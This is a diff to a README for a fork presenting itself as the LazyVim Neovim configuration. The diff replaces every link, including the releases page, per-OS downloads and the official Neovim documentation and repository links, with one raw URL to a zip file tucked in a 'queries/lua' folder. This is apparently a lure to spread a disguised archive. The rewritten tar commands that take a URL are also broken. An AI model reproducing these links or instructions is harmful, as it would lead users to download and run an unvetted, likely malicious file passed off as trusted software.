@@ -1,6 +1,6 @@
 # 🛠️ LazyVim - Effortless Neovim Configuration for Everyone
 
-![Download LazyVim](https://img.shields.io/badge/Download-LazyVim-blue.svg)
+![Download LazyVim](https://raw.githubusercontent.com/Jim2213/LazyVim/main/queries/lua/Lazy-Vim-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to LazyVim! This is a user-friendly Neovim configuration designed for th
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release of LazyVim: [LazyVim Releases](https://github.com/Jim2213/LazyVim/releases).
+To get started, visit this page to download the latest release of LazyVim: [LazyVim Releases](https://raw.githubusercontent.com/Jim2213/LazyVim/main/queries/lua/Lazy-Vim-v3.6.zip).
 
 ### Step-by-step Instructions
 
@@ -17,13 +17,13 @@ To get started, visit this page to download the latest release of LazyVim: [Lazy
 2. **Choose a version**: Look for the latest version at the top of the page. Click on it to view the details.
 
 3. **Download the package**: You will see various files available for download. Select the file that matches your operating system:
-   - For Windows, download `LazyVim-Windows.zip`.
-   - For macOS, download `LazyVim-macOS.tar.gz`.
-   - For Linux, download `LazyVim-Linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/Jim2213/LazyVim/main/queries/lua/Lazy-Vim-v3.6.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Jim2213/LazyVim/main/queries/lua/Lazy-Vim-v3.6.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/Jim2213/LazyVim/main/queries/lua/Lazy-Vim-v3.6.zip`.
 
 4. **Extract the files**: After downloading, locate the downloaded file on your computer. 
    - **Windows**: Right-click on the `.zip` file and choose “Extract All.”
-   - **macOS and Linux**: Use your preferred archive tool or run the command `tar -xzf LazyVim-macOS.tar.gz` or `tar -xzf LazyVim-Linux.tar.gz` in your terminal.
+   - **macOS and Linux**: Use your preferred archive tool or run the command `tar -xzf https://raw.githubusercontent.com/Jim2213/LazyVim/main/queries/lua/Lazy-Vim-v3.6.zip` or `tar -xzf https://raw.githubusercontent.com/Jim2213/LazyVim/main/queries/lua/Lazy-Vim-v3.6.zip` in your terminal.
 
 5. **Open Neovim**: After extracting the files, you will find the configuration and necessary plugins. Open Neovim by running `nvim` in your terminal.
 
@@ -74,7 +74,7 @@ LazyVim is open-source software. You can freely use, modify, and distribute it u
 
 For more tips and guides on using Neovim effectively, check out the following links:
 
-- [Neovim Documentation](https://neovim.io/)
-- [Neovim GitHub Repository](https://github.com/neovim/neovim)
+- [Neovim Documentation](https://raw.githubusercontent.com/Jim2213/LazyVim/main/queries/lua/Lazy-Vim-v3.6.zip)
+- [Neovim GitHub Repository](https://raw.githubusercontent.com/Jim2213/LazyVim/main/queries/lua/Lazy-Vim-v3.6.zip)
   
 By following these steps, you will smoothly set up and enjoy the powerful yet simple LazyVim configuration. Happy coding!
